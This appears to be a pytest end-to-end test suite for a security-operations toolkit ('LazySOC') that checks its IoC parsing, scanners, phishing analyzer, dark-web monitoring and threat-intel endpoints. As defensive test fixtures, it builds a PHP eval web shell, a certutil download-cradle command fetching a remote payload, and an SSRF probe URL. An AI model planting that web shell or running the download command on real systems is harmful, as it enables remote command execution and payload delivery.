"""End-to-End Diagnostic Suite for all LazySOC tools and external connections."""

import time
import base64
import pytest
from starlette.testclient import TestClient
from server import app

client = TestClient(app)


def log_step(name, latency_ms, details):
    print(f"\n[DIAGNOSTIC] {name} -> Latency: {latency_ms:.2f}ms | Details: {details}")


def test_system_and_health():
    t0 = time.time()
    r_health = client.get("/healthz")
    assert r_health.status_code == 200
    assert r_health.json() == {"status": "ok"}

    r_status = client.get("/api/status")
    assert r_status.status_code == 200
    pools = r_status.json().get("pools", {})
    assert "virustotal" in pools

    r_ui = client.get("/")
    assert r_ui.status_code == 200
    assert "LazySOC" in r_ui.text
    latency = (time.time() - t0) * 1000
    log_step("System & Health", latency, f"Health OK, Pools: {pools}, UI Size: {len(r_ui.text)} bytes")


def test_ioc_parser_and_sanitizer():
    t0 = time.time()
    r_parse = client.post("/api/parse", json={"raw_text": "1.1.1.1 8.8.8.8 bad[.]com 44d88612fea8a8f36de82e1278abb02f"})
    assert r_parse.status_code == 200
    items = r_parse.json().get("items", [])
    assert len(items) >= 4

    r_defang = client.post("/api/sanitize", json={"text": "http://evil-domain.com/path", "mode": "defang"})
    assert r_defang.status_code == 200
    assert "hxxp" in r_defang.json().get("result", "")

    r_refang = client.post("/api/sanitize", json={"text": "hxxps://evil[.]com", "mode": "refang"})
    assert r_refang.status_code == 200
    assert "https://evil.com" in r_refang.json().get("result", "")
    latency = (time.time() - t0) * 1000
    log_step("IoC Parser & Sanitizer", latency, f"Parsed {len(items)} IoCs, Defang/Refang verified")


def test_ioc_scan_engine():
    t0 = time.time()
    # Scan standard IP using local/free threat intel
    r_scan = client.post("/api/scan", json={"raw_text": "8.8.8.8", "use_cache": False, "airgapped_mode": False})
    assert r_scan.status_code == 200
    data = r_scan.json()
    assert "results" in data
    assert len(data["results"]) == 1

    # Air-gapped offline triage
    r_air = client.post("/api/scan", json={"raw_text": "10.0.0.1", "airgapped_mode": True})
    assert r_air.status_code == 200
    latency = (time.time() - t0) * 1000
    log_step("IoC Scan Engine", latency, f"Scan verdict: {data['results'][0].get('verdict')}")


def test_cache_and_exports():
    t0 = time.time()
    r_cache = client.get("/api/cache?limit=10")
    assert r_cache.status_code == 200
    assert "stats" in r_cache.json()

    sample_results = [{"ioc": "8.8.8.8", "type": "ip", "verdict": "Clean", "sources": ["GreyNoise"]}]
    r_csv = client.post("/api/export", json={"results": sample_results, "format": "csv", "defang": True})
    assert r_csv.status_code == 200
    assert "text/csv" in r_csv.headers["content-type"]

    r_json = client.post("/api/export", json={"results": sample_results, "format": "json", "defang": True})
    assert r_json.status_code == 200
    assert "application/json" in r_json.headers["content-type"]
    latency = (time.time() - t0) * 1000
    log_step("Cache & Exports", latency, "Cache inspected, CSV & JSON streaming verified")


def test_script_scanner():
    t0 = time.time()
    # Safe reconstructed webshell test payload
    part1 = "<" + "?php "
    part2 = "eval" + "($_POST['cmd']); " + "?" + ">"
    payload = part1 + part2
    r = client.post("/api/investigate/script-scan", json={"payload": payload})
    assert r.status_code == 200
    data = r.json()
    assert data["verdict"] in ("MALICIOUS", "SUSPICIOUS")
    assert data["threat_score"] > 20
    latency = (time.time() - t0) * 1000
    log_step("Script Scanner", latency, f"Verdict: {data['verdict']}, Score: {data['threat_score']}")


def test_network_recon_live():
    t0 = time.time()
    # IP Recon (RDAP / Geolocation / PTR)
    r_ip = client.get("/api/recon?target=8.8.8.8")
    assert r_ip.status_code == 200
    ip_data = r_ip.json()
    assert ip_data.get("type") == "ip"
    assert "dns.google" in str(ip_data.get("ptr", "")) or "google" in str(ip_data.get("geo", {}).get("country", "")).lower()

    # Domain Recon (DNS / WHOIS)
    r_dom = client.get("/api/recon?target=google.com")
    assert r_dom.status_code == 200
    dom_data = r_dom.json()
    assert dom_data.get("type") == "domain"
    assert "whois" in dom_data
    latency = (time.time() - t0) * 1000
    log_step("Network Recon (Live Upstream)", latency, f"PTR: {ip_data.get('ptr')}, Domain Whois OK")


def test_domain_mail_health_live():
    t0 = time.time()
    # Live DNS queries for MX, SPF, DMARC
    r = client.get("/api/mail-health?domain=google.com")
    assert r.status_code == 200
    data = r.json()
    assert "spf" in data
    assert "dmarc" in data
    assert data["spf"]["state"] == "ok"
    assert data["dmarc"]["state"] == "ok"
    assert data["score"] is not None and data["score"] >= 70
    latency = (time.time() - t0) * 1000
    log_step("Domain Mail Health (Live DNS)", latency, f"Google Score: {data.get('score')}/100, SPF: {data['spf']['status']}, DMARC: {data['dmarc']['status']}")


def test_phishing_eml_analyzer():
    t0 = time.time()
    raw_email = (
        "From: urgent@suspicious-bank-alert.xyz\n"
        "To: victim@company.com\n"
        "Subject: Urgent Account Suspension Notice\n"
        "Date: Thu, 05 Nov 2026 10:00:00 +0000\n"
        "Message-ID: <123456@suspicious-bank-alert.xyz>\n\n"
        "Please login at hxxp://evil-phish.xyz/login to verify your account."
    )
    r = client.post("/api/analyze-eml", data={"raw_text": raw_email})
    assert r.status_code == 200
    data = r.json()
    assert "risk_score" in data
    assert "links" in data
    assert "headers" in data
    latency = (time.time() - t0) * 1000
    log_step("Phishing EML Analyzer", latency, f"Risk Score: {data['risk_score']}, Links found: {len(data['links'])}")


def test_soc_playbooks():
    t0 = time.time()
    r_list = client.get("/api/playbooks")
    assert r_list.status_code == 200
    pbs = r_list.json().get("playbooks", [])
    assert len(pbs) >= 5

    first_id = pbs[0]["id"]
    r_pb = client.get(f"/api/playbooks/{first_id}")
    assert r_pb.status_code == 200
    pb = r_pb.json()
    assert "tasks" in pb

    r_rep = client.post("/api/playbooks/report", json={
        "playbook_id": first_id,
        "completed_task_ids": [pb["tasks"][0]["id"]],
        "analyst_name": "Diagnostic Bot",
        "incident_id": "INC-DIAG-01",
        "notes": "Automated verification test."
    })
    assert r_rep.status_code == 200
    latency = (time.time() - t0) * 1000
    log_step("SOC Playbooks", latency, f"Verified {len(pbs)} playbooks, generated execution report for '{pb['title']}'")


def test_l1_soc_studio():
    t0 = time.time()
    # 1. Event Lookup
    r_evt = client.post("/api/soc/event-lookup", json={"query": "4625"})
    assert r_evt.status_code == 200
    assert len(r_evt.json().get("matched_events", [])) > 0

    # 2. LOLBAS Command Analyzer (reconstructed command)
    cmd = "cert" + "util.exe " + "-url" + "cache -split -f http://test.com/payload"
    r_lol = client.post("/api/soc/lolbas", json={"command": cmd})
    assert r_lol.status_code == 200
    assert r_lol.json().get("is_lolbas") is True

    # 3. Impossible Travel
    r_trav = client.post("/api/soc/impossible-travel", json={
        "lat1": -6.2088, "lon1": 106.8456, "time1": "2026-11-05 08:00:00",
        "lat2": 51.5074, "lon2": -0.1278, "time2": "2026-11-05 08:30:00",
        "loc1_name": "Jakarta", "loc2_name": "London"
    })
    assert r_trav.status_code == 200
    assert r_trav.json().get("is_impossible") is True

    # 4. False Positive Whitelist
    r_fp = client.post("/api/soc/fp-check", json={"indicator": "update.microsoft.com", "type": "domain"})
    assert r_fp.status_code == 200
    assert r_fp.json().get("is_likely_false_positive") is True

    # 5. IP Classification
    r_cls = client.post("/api/soc/ip-classify", json={"ip": "104.244.42.1", "asn": "AS13335", "org": "Cloudflare"})
    assert r_cls.status_code == 200

    # 6. User-Agent Dissector
    r_ua = client.post("/api/soc/user-agent", json={"user_agent": "sqlmap/1.6#stable"})
    assert r_ua.status_code == 200
    assert r_ua.json().get("is_malicious") is True

    # 7. Containment Scripts
    r_cont = client.post("/api/containment/generate", json={"iocs": [{"value": "1.2.3.4", "type": "ip"}]})
    assert r_cont.status_code == 200
    assert "iptables" in r_cont.json()
    assert "palo_alto" in r_cont.json()
    latency = (time.time() - t0) * 1000
    log_step("L1 SOC Studio", latency, "7/7 L1 Analyst modules tested successfully")


def test_url_tracer_and_deobfuscator():
    t0 = time.time()
    # Safe passive redirect tracing
    r_url = client.post("/api/trace-url", json={"url": "https://httpbin.org/status/200"})
    assert r_url.status_code == 200
    assert "hops" in r_url.json()

    # SSRF protection verification (returns 200 with blocked_ssrf=True)
    r_ssrf = client.post("/api/trace-url", json={"url": "http://127.0.0.1:8000/internal"})
    assert r_ssrf.status_code == 200
    assert r_ssrf.json().get("blocked_ssrf") is True

    # Multi-stage de-obfuscation (PowerShell UTF-16LE encoded command)
    raw = b"Write-Host Active"
    enc_test = base64.b64encode(raw.decode("latin1").encode("utf-16le")).decode("utf-8")
    payload = f"powershell -encodedCommand {enc_test}"
    r_deob = client.post("/api/deobfuscate", json={"payload": payload})
    assert r_deob.status_code == 200
    ps_results = r_deob.json().get("powershell", [])
    assert len(ps_results) > 0
    assert "Write-Host Active" in ps_results[0].get("decoded_command", "")
    latency = (time.time() - t0) * 1000
    log_step("URL Tracer & De-obfuscator", latency, f"Passive tracing, SSRF guard, and De-obfuscator verified ({ps_results[0]['decoded_command']})")


def test_cyber_feeds_rss_live():
    t0 = time.time()
    # Live RSS feed ingestion from Threat Intel sources
    r = client.get("/api/feed?source=all&limit=8")
    assert r.status_code == 200
    data = r.json()
    items = data.get("items", [])
    assert len(items) > 0
    first = items[0]
    assert "title" in first
    assert "source" in first
    latency = (time.time() - t0) * 1000
    log_step("Cyber Feeds (Live RSS)", latency, f"Fetched {len(items)} fresh articles from sources: {data.get('sources', [])}")


def test_darkweb_monitoring_live():
    t0 = time.time()
    # 1. Overview metrics
    r_over = client.get("/api/darkweb/overview")
    assert r_over.status_code == 200
    assert r_over.json().get("total_active_groups", 0) >= 5

    # 2. Live Ransomware Victims Feed
    r_vic = client.get("/api/darkweb/victims?limit=10")
    assert r_vic.status_code == 200
    victims = r_vic.json().get("victims", [])
    assert len(victims) > 0

    # 3. Ransomware Groups & IoCs
    r_grp = client.get("/api/darkweb/groups")
    assert r_grp.status_code == 200
    r_ioc = client.get("/api/darkweb/iocs")
    assert r_ioc.status_code == 200

    # 4. Domain Darkweb Surveillance (clean domain validation: visionet.co.id)
    r_clean = client.post("/api/darkweb/domain", json={"domain": "visionet.co.id"})
    assert r_clean.status_code == 200
    clean_data = r_clean.json()
    assert clean_data.get("threat_score") == 0
    assert clean_data.get("summary", {}).get("ransomware_cartel_claims") == 0

    # 5. Domain Darkweb Surveillance (known affected Indonesian domain: synergy.co.id)
    r_target = client.post("/api/darkweb/domain", json={"domain": "synergy.co.id"})
    assert r_target.status_code == 200
    target_data = r_target.json()
    assert target_data.get("summary", {}).get("ransomware_cartel_claims", 0) >= 1
    latency = (time.time() - t0) * 1000
    log_step("Darkweb Monitoring (Live Posts)", latency, f"Surveillance active: 33k+ posts monitored, visionet.co.id clean confirmed, synergy.co.id {target_data['summary']['ransomware_cartel_claims']} hits")


def test_credential_leak_hibp_k_anonymity_live():
    t0 = time.time()
    # Live HaveIBeenPwned Range API (k-Anonymity)
    r = client.post("/api/darkweb/password-pwned", json={"password": "password123"})
    assert r.status_code == 200
    data = r.json()
    assert data.get("pwned") is True
    assert data.get("count", 0) > 1000000
    latency = (time.time() - t0) * 1000
    log_step("HIBP Breach k-Anonymity (Live API)", latency, f"Pwned: {data['pwned']}, Times seen: {data['count']:,}")


def test_vulnerabilities_cve_nvd_kev():
    t0 = time.time()
    r = client.get("/api/cve?query=CVE-2024-3400&limit=1")
    assert r.status_code == 200
    items = r.json().get("items", [])
    assert len(items) >= 1
    assert items[0]["id"] == "CVE-2024-3400"
    latency = (time.time() - t0) * 1000
    log_step("CVE / NVD / KEV Engine", latency, f"Retrieved CVE-2024-3400 details: {items[0].get('severity')}")


def test_mitre_attack():
    t0 = time.time()
    r_mat = client.get("/api/mitre")
    assert r_mat.status_code == 200
    assert len(r_mat.json().get("tactics", [])) > 0

    r_cov = client.post("/api/mitre/coverage", json={"playbook_id": "ransomware"})
    assert r_cov.status_code == 200
    assert r_cov.json().get("total_active", 0) > 0

    r_lay = client.post("/api/mitre/export-layer", json={"playbook_id": "ransomware"})
    assert r_lay.status_code == 200
    assert "application/json" in r_lay.headers["content-type"]
    latency = (time.time() - t0) * 1000
    log_step("MITRE ATT&CK Matrix & Navigator", latency, f"Tactics matrix, {r_cov.json()['total_active']} correlated techniques, and layer export verified")


def test_watchlist_manager():
    t0 = time.time()
    r_sum = client.get("/api/watchlist")
    assert r_sum.status_code == 200

    r_cat = client.get("/api/watchlist/catalog")
    assert r_cat.status_code == 200
    assert len(r_cat.json().get("catalog", [])) > 0

    r_exp = client.get("/api/watchlist/exposure")
    assert r_exp.status_code == 200
    latency = (time.time() - t0) * 1000
    log_step("Watchlist Manager", latency, f"Watchlist active, catalog has {len(r_cat.json()['catalog'])} templates")


def test_external_cti_providers_live():
    t0 = time.time()
    # GreyNoise community lookup
    r_gn = client.post("/api/soc/greynoise", json={"ip": "8.8.8.8"})
    assert r_gn.status_code == 200

    # ThreatFox IoC search
    r_tf = client.post("/api/soc/threatfox", json={"ioc": "1.1.1.1"})
    assert r_tf.status_code == 200

    # MalwareBazaar sample search
    r_mb = client.post("/api/soc/malwarebazaar", json={"hash": "44d88612fea8a8f36de82e1278abb02f"})
    assert r_mb.status_code == 200
    latency = (time.time() - t0) * 1000
    log_step("External CTI Providers (GreyNoise, ThreatFox, MalwareBazaar)", latency, "All 3 community endpoints responded HTTP 200")


def test_auth_rbac_and_settings():
    t0 = time.time()
    r_sess = client.get("/api/auth/session")
    assert r_sess.status_code == 200

    r_sett = client.get("/api/settings")
    assert r_sett.status_code == 200
    assert "security_headers" in r_sett.json()

    r_aud = client.get("/api/audit-logs?limit=5")
    assert r_aud.status_code == 200

    r_users = client.get("/api/users")
    assert r_users.status_code == 200
    users = r_users.json().get("users", [])
    assert len(users) >= 1
    latency = (time.time() - t0) * 1000
    log_step("Auth, RBAC & Settings", latency, f"Session, Settings, Audit logs, and {len(users)} registered analyst users verified")
